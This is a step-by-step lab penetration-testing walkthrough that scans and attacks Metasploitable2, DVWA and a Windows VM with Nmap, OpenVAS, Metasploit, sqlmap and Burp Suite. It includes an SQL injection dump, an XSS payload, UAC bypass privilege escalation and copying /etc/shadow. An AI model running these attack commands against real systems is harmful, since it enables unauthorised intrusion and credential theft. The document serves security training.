# 🪜 Week 2 — Step-by-Step VAPT Workflow

> This file documents every ordered step performed during the Week 2 VAPT cycle.
> Each phase follows the **PTES (Penetration Testing Execution Standard)** methodology.

---

## Phase 0 — Environment Setup

### Step 1: Start Lab VMs

```bash
# On VMware/VirtualBox host:
# 1. Start Kali Linux VM (Attacker)
# 2. Start Metasploitable2 VM (Target)
# 3. Ensure both are on Host-Only network adapter

# Verify attacker IP
ip a
# Expected: eth0 → 192.168.1.x

# Verify target is reachable
ping 192.168.1.100
```

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: VMware/VirtualBox showing both VMs running]`

---

### Step 2: Verify Tool Availability

```bash
# Confirm tools are installed on Kali
nmap --version
openvas-start   # NOT needed — OpenVAS runs on its own dedicated VM
nikto -Version
msfconsole --version
sqlmap --version
```

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: Terminal showing version output of all tools]`

---

## Phase 1 — Vulnerability Scanning

### Step 3: Nmap Port Scan

```bash
# Basic service version scan on Metasploitable2
nmap -sV 192.168.1.100

# More aggressive scan with OS detection and scripts
nmap -A -sV -sC -O 192.168.1.100 -oN logs/nmap_metasploitable.txt

# Scan common web ports only
nmap -p 80,443,8080,8443 -sV 192.168.1.100
```

**Expected Output Snippet:**
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1
23/tcp   open  telnet      Linux telnetd
80/tcp   open  http        Apache httpd 2.2.8
445/tcp  open  netbios-ssn Samba 3.x
3306/tcp open  mysql       MySQL 5.0.51a
```

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: Nmap terminal output showing open ports on 192.168.1.100]`

---

### Step 4: OpenVAS Vulnerability Scan

OpenVAS runs on a **dedicated VM** in the lab (`192.168.1.102`). It is accessed directly from the **host machine's browser** — no need to start anything on Kali.

```bash
# On Kali — verify OpenVAS VM is reachable
ping 192.168.1.102

# No gvm-start required — OpenVAS is already running on its own VM
```

**Access the OpenVAS Web UI from your Host Machine:**
```
Open browser on Host → https://192.168.1.102:9392
Login: admin / <your_openvas_password>
```

> ⚠️ Accept the self-signed certificate warning in the browser — this is expected for lab setups.

**In the OpenVAS Web UI:**
1. Go to **Scans → Tasks → New Task**
2. Set Target: `192.168.1.100` (Metasploitable2)
3. Add second target: `192.168.1.101` (Windows 10 VM)
4. Scan Config: **Full and Fast**
5. Click **Save** → **Start**
6. Wait for scan to complete (15–40 min depending on targets)
7. Go to **Reports** → Export as PDF/XML

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: OpenVAS dashboard showing task running]`

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: OpenVAS report summary showing vulnerabilities found]`

---

### Step 5: Nikto Web Scan

```bash
# Scan the web server on Metasploitable2
nikto -h http://192.168.1.100 -output logs/nikto_scan.txt

# Scan with specific port
nikto -h http://192.168.1.100 -p 80 -Format txt -output logs/nikto_port80.txt
```

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: Nikto scan running in terminal with findings]`

---

### Step 6: Prioritize & Document Findings

Paste findings into the [Scan Logs](../logs/scan_logs.md) table using CVSS v4.0 scoring.

---

## Phase 2 — Reconnaissance (OSINT)

### Step 7: WHOIS Lookup

```bash
# On a real domain (for educational demo — use example.com)
whois example.com

# Using online tool: https://lookup.icann.org
```

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: WHOIS output showing registrant/DNS info]`

---

### Step 8: Subdomain Enumeration with Sublist3r

```bash
# Install if not present
pip3 install sublist3r

# Run against a target domain
python3 sublist3r.py -d example.com -o logs/subdomains.txt

# View results
cat logs/subdomains.txt
```

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: Sublist3r output listing discovered subdomains]`

---

### Step 9: Shodan Search

```bash
# From terminal (requires API key)
pip3 install shodan
shodan init YOUR_API_KEY
shodan host 192.168.1.100

# Or use browser: https://www.shodan.io
# Search: "apache 2.2" country:IN
```

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: Shodan search results page]`

---

### Step 10: Maltego Asset Mapping

```bash
# Launch Maltego (GUI)
maltego
```

**In Maltego:**
1. Create new graph
2. Drag **Domain** entity → Enter `example.com`
3. Right-click → **Run All Transforms**
4. Observe linked IPs, emails, subdomains
5. Export graph as PNG

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: Maltego graph showing entity relationships]`

---

### Step 11: Tech Stack Fingerprinting (Wappalyzer)

```bash
# Install Wappalyzer CLI
npm install -g wappalyzer

# Scan target
wappalyzer http://192.168.1.100
```

**Or use browser extension:** Install Wappalyzer → visit target URL → screenshot results.

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: Wappalyzer showing detected technologies]`

---

## Phase 3 — Exploitation

### Step 12: Metasploit — Tomcat Manager Login

```bash
# Start Metasploit
msfconsole

# Search for module
msf6 > search tomcat_mgr

# Use the module
msf6 > use exploit/multi/http/tomcat_mgr_login
msf6 exploit(...) > show options

# Configure options
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set RPORT 8180
msf6 exploit(...) > set STOP_ON_SUCCESS true

# Run the exploit
msf6 exploit(...) > run
```

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: Metasploit console showing successful Tomcat login]`

---

### Step 13: sqlmap — SQL Injection on DVWA

> **Note:** DVWA is hosted on **Metasploitable2** (`192.168.1.100/dvwa`) — not a separate VM.

```bash
# DVWA runs at: http://192.168.1.100/dvwa
# Login: admin / password → Set Security to "Low"
# Get cookie from browser (DevTools → Application → Cookies)

# Run sqlmap
sqlmap -u "http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
  --dbs \
  --batch

# Dump users table
sqlmap -u "http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION_ID; security=low" \
  -D dvwa --tables --dump \
  --batch
```

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: sqlmap running and showing databases found]`

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: sqlmap dumping users table from DVWA]`

---

### Step 14: Burp Suite — XSS Testing

```bash
# Launch Burp Suite
burpsuite &

# Configure browser proxy: 127.0.0.1:8080
```

**In Burp Suite:**
1. Go to **Proxy → Intercept → On**
2. Visit DVWA XSS page: `http://192.168.1.100/dvwa/vulnerabilities/xss_r/`
3. Enter payload in Name field: `<script>alert('XSS')</script>`
4. Intercept request in Burp → Forward
5. Confirm alert popup in browser

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: Burp Suite showing intercepted XSS request]`

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: Browser showing XSS alert popup]`

---

## Phase 4 — Post-Exploitation

### Step 15: Privilege Escalation (BypassUAC)

```bash
# After gaining initial session via Metasploit
msf6 > sessions -l
# Note session ID (e.g., 1)

msf6 > use exploit/windows/local/bypassuac
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > run

# Verify elevated privileges
meterpreter > getuid
meterpreter > getsystem
```

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: Meterpreter shell with SYSTEM-level privileges]`

---

### Step 16: Evidence Collection & Hashing

```bash
# In Meterpreter session — download target config
meterpreter > download /etc/passwd /tmp/collected/passwd.txt
meterpreter > download /etc/shadow /tmp/collected/shadow.txt

# Exit meterpreter
meterpreter > background

# Hash the collected files (on Kali)
sha256sum /tmp/collected/passwd.txt
sha256sum /tmp/collected/shadow.txt

# Document in evidence log
echo "passwd.txt | $(sha256sum /tmp/collected/passwd.txt)" >> logs/evidence_chain.txt
```

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: sha256sum output for collected files]`

---

### Step 17: Memory Analysis with Volatility (Optional)

```bash
# Acquire memory dump (if Windows target)
# Use winpmem or similar tool on target

# Analyze with Volatility
volatility -f memory.dmp imageinfo
volatility -f memory.dmp --profile=WinXPSP3x86 pslist
volatility -f memory.dmp --profile=WinXPSP3x86 netscan
```

**📸 Screenshot Placeholder:**
> `[SCREENSHOT: Volatility process list output]`

---

## Phase 5 — Reporting

### Step 18: Compile All Findings

Refer to [Full VAPT Report](../reports/VAPT_Full_Report.md) for the complete compiled report.

### Step 19: Remediation Escalation Email

Refer to [Full VAPT Report — Section 8](../reports/VAPT_Full_Report.md#8-escalation-email-to-developers) for the draft email.

### Step 20: GitHub Repository Submission

```bash
# From local machine
git clone https://github.com/your-org/cyart-vapt-team.git
cd cyart-vapt-team/week2

# Add all documentation
git add .
git commit -m "Week 2: Complete VAPT documentation — scans, exploitation, report"
git push origin main
```

---

*End of Steps — All phases complete.*
